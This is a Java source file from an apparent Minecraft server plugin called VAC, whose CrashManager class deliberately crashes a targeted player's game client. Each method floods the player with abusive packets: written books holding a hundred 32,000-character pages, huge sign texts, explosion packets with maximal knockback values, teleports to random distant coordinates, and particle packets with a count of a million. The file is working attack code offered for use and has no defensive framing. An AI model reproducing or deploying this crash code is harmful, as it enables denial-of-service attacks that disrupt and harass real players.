package vac.crash;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BookMeta;
import org.bukkit.scheduler.BukkitRunnable;
import vac.util.PacketUtils;
import vac.util.VersionUtil;
import vac.VAC;

import java.lang.reflect.Constructor;
import java.util.*;

public class CrashManager {

    private final VAC plugin;

    public CrashManager(VAC plugin) {
        this.plugin = plugin;
    }

    public void crashPlayer(Player player, String method) {
        switch (method.toLowerCase()) {
            case "book":
                crashBook(player);
                break;
            case "sign":
                crashSign(player);
                break;
            case "explosion":
                crashExplosion(player);
                break;
            case "particle":
                crashParticle(player);
                break;
            case "flood":
                crashFlood(player);
                break;
            case "all":
                crashAll(player);
                break;
            default:
                crashBook(player);
                break;
        }
    }

    private void crashBook(Player player) {
        String page = generateHugeString(32000);
        String nbtPage = generateNBTCrashString();

        ItemStack book = new ItemStack(Material.WRITTEN_BOOK);
        BookMeta meta = (BookMeta) book.getItemMeta();
        if (meta != null) {
            meta.setTitle("VAC");
            meta.setAuthor("VAC");
            List<String> pages = new ArrayList<>();
            for (int i = 0; i < 100; i++) pages.add(page);
            pages.add(nbtPage);
            meta.setPages(pages);
            book.setItemMeta(meta);
        }

        for (int i = 0; i < 100; i++) {
            PacketUtils.sendPacket(player, PacketUtils.createPacketPlayOutSetSlot(0, i % 40, book));
            PacketUtils.sendPacket(player, PacketUtils.createPacketPlayOutSetSlot(1, i % 36, book));
        }
    }

    private void crashSign(Player player) {
        Location loc = player.getLocation();
        int baseX = loc.getBlockX();
        int baseY = Math.min(255, Math.max(0, loc.getBlockY() + 2));
        int baseZ = loc.getBlockZ();

        new BukkitRunnable() {
            int tick = 0;
            @Override
            public void run() {
                if (!player.isOnline() || tick >= 100) {
                    this.cancel();
                    return;
                }
                for (int i = 0; i < 5; i++) {
                    int offset = (tick * 5 + i) % 50;
                    PacketUtils.sendPacket(player, PacketUtils.createPacketPlayOutOpenSignEditor(
                            baseX + offset, baseY, baseZ + offset));
                    try {
                        Object blockPos = PacketUtils.createBlockPos(baseX + offset, baseY, baseZ + offset);
                        if (blockPos != null) {
                            PacketUtils.sendPacket(player, createSignUpdatePacket(blockPos, generateHugeString(30000)));
                        }
                    } catch (Exception ignored) {}
                }
                tick++;
            }
        }.runTaskTimer(plugin, 0L, 1L);
    }

    private void crashExplosion(Player player) {
        Location loc = player.getLocation();
        List<Object> blocks = PacketUtils.createExplodedBlockPositions(
                loc.getBlockX(), loc.getBlockY(), loc.getBlockZ(), 15);

        for (int i = 0; i < 100; i++) {
            Object packet = PacketUtils.createPacketPlayOutExplosion(
                    loc.getX(), loc.getY(), loc.getZ(),
                    200.0f, blocks,
                    Float.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE);
            PacketUtils.sendPacket(player, packet);
        }

        for (int i = 0; i < 50; i++) {
            float yaw = player.getLocation().getYaw() + (float) (Math.random() - 0.5) * 360;
            float pitch = (float) (Math.random() - 0.5) * 180;
            Object pos = PacketUtils.createPacketPlayOutPosition(
                    loc.getX() + (Math.random() - 0.5) * 60000,
                    loc.getY() + (Math.random() - 0.5) * 60000,
                    loc.getZ() + (Math.random() - 0.5) * 60000,
                    yaw, pitch);
            PacketUtils.sendPacket(player, pos);
        }
    }

    private void crashParticle(Player player) {
        Location loc = player.getLocation();

        new BukkitRunnable() {
            int count = 0;
            @Override
            public void run() {
                if (!player.isOnline() || count >= 40) {
                    this.cancel();
                    return;
                }
                for (int i = 0; i < 50; i++) {
                    Object packet = PacketUtils.createPacketPlayOutWorldParticles(
                            "EXPLOSION_LARGE",
                            (float) (loc.getX() + (Math.random() - 0.5) * 20),
                            (float) (loc.getY() + Math.random() * 10),
                            (float) (loc.getZ() + (Math.random() - 0.5) * 20),
                            1000000,
                            5f, 5f, 5f, 100f);
                    PacketUtils.sendPacket(player, packet);
                }
                count++;
            }
        }.runTaskTimer(plugin, 0L, 1L);
    }

    private void crashFlood(Player player) {
        Location loc = player.getLocation();

        new BukkitRunnable() {
            int tick = 0;
            @Override
            public void run() {
                if (!player.isOnline() || tick >= 60) {
                    this.cancel();
                    return;
                }
                String hugePage = generateHugeString(32000);
                ItemStack book = new ItemStack(Material.WRITTEN_BOOK);
                BookMeta meta = (BookMeta) book.getItemMeta();
                if (meta != null) {
                    meta.setTitle("VAC");
                    meta.setAuthor("VAC");
                    List<String> pages = new ArrayList<>();
                    for (int j = 0; j < 100; j++) pages.add(hugePage);
                    meta.setPages(pages);
                    book.setItemMeta(meta);
                }

                for (int i = 0; i < 40; i++) {
                    PacketUtils.sendPacket(player, PacketUtils.createPacketPlayOutSetSlot(0, i % 40, book));
                    PacketUtils.sendPacket(player, PacketUtils.createPacketPlayOutPosition(
                            loc.getX() + (Math.random() - 0.5) * 60000,
                            loc.getY() + (Math.random() - 0.5) * 60000,
                            loc.getZ() + (Math.random() - 0.5) * 60000,
                            (float)(Math.random() * 360), (float)(Math.random() * 180 - 90)));
                    PacketUtils.sendPacket(player, PacketUtils.createPacketPlayOutWorldParticles(
                            "EXPLOSION_LARGE",
                            (float)(loc.getX() + (Math.random() - 0.5) * 100),
                            (float)(loc.getY() + Math.random() * 50),
                            (float)(loc.getZ() + (Math.random() - 0.5) * 100),
                            1000000, 5f, 5f, 5f, 100f));
                }
                tick++;
            }
        }.runTaskTimer(plugin, 0L, 1L);
    }

    private void crashAll(Player player) {
        crashBook(player);
        crashExplosion(player);

        Location loc = player.getLocation();

        new BukkitRunnable() {
            int tick = 0;
            @Override
            public void run() {
                if (!player.isOnline() || tick >= 80) {
                    this.cancel();
                    return;
                }
                String hugePage = generateHugeString(32000);
                ItemStack book = new ItemStack(Material.WRITTEN_BOOK);
                BookMeta meta = (BookMeta) book.getItemMeta();
                if (meta != null) {
                    meta.setTitle("VAC");
                    meta.setAuthor("VAC");
                    List<String> pages = new ArrayList<>();
                    for (int j = 0; j < 100; j++) pages.add(hugePage);
                    meta.setPages(pages);
                    book.setItemMeta(meta);
                }

                for (int i = 0; i < 20; i++) {
                    int offset = (tick * 20 + i) % 50;
                    PacketUtils.sendPacket(player, PacketUtils.createPacketPlayOutSetSlot(0, i % 40, book));
                    PacketUtils.sendPacket(player, PacketUtils.createPacketPlayOutOpenSignEditor(
                            loc.getBlockX() + offset, loc.getBlockY() + 2, loc.getBlockZ() + offset));
                    try {
                        Object bp = PacketUtils.createBlockPos(loc.getBlockX() + offset, loc.getBlockY() + 2, loc.getBlockZ() + offset);
                        if (bp != null) {
                            PacketUtils.sendPacket(player, createSignUpdatePacket(bp, generateHugeString(30000)));
                        }
                    } catch (Exception ignored) {}
                    PacketUtils.sendPacket(player, PacketUtils.createPacketPlayOutPosition(
                            loc.getX() + (Math.random() - 0.5) * 60000,
                            loc.getY() + (Math.random() - 0.5) * 60000,
                            loc.getZ() + (Math.random() - 0.5) * 60000,
                            (float)(Math.random() * 360), (float)(Math.random() * 180 - 90)));
                    PacketUtils.sendPacket(player, PacketUtils.createPacketPlayOutWorldParticles(
                            "EXPLOSION_LARGE",
                            (float)(loc.getX() + (Math.random() - 0.5) * 100),
                            (float)(loc.getY() + Math.random() * 50),
                            (float)(loc.getZ() + (Math.random() - 0.5) * 100),
                            1000000, 5f, 5f, 5f, 100f));
                }
                tick++;
            }
        }.runTaskTimer(plugin, 0L, 1L);
    }

    private String generateHugeString(int length) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < length; i++) {
            sb.append("§k");
        }
        return sb.toString();
    }

    private String generateNBTCrashString() {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 32000; i++) {
            sb.append((char) (0xE000 + (i % 0xE000)));
        }
        return sb.toString();
    }

    private Object createSignUpdatePacket(Object blockPos, String hugeText) {
        try {
            VersionUtil.init();
            Class<?> clazz = VersionUtil.getNmsClass("PacketPlayOutTileEntityData");
            Class<?> bpClass = VersionUtil.getNmsClass("BlockPosition");
            Class<?> nbtClass = VersionUtil.getNmsClass("NBTTagCompound");

            Constructor<?> ctor = clazz.getConstructor(bpClass, int.class, nbtClass);
            Object nbt = nbtClass.getDeclaredConstructor().newInstance();

            String json = "{\"text\":\"" + hugeText + "\"}";
            nbtClass.getMethod("setString", String.class, String.class).invoke(nbt, "Text1", json);
            nbtClass.getMethod("setString", String.class, String.class).invoke(nbt, "Text2", json);
            nbtClass.getMethod("setString", String.class, String.class).invoke(nbt, "Text3", json);
            nbtClass.getMethod("setString", String.class, String.class).invoke(nbt, "Text4", json);

            return ctor.newInstance(blockPos, 9, nbt);
        } catch (Exception e) {
            return null;
        }
    }

    public List<String> getAvailableMethods() {
        return Arrays.asList("book", "sign", "explosion", "particle", "flood", "all");
    }

    public void shutdown() {}
}
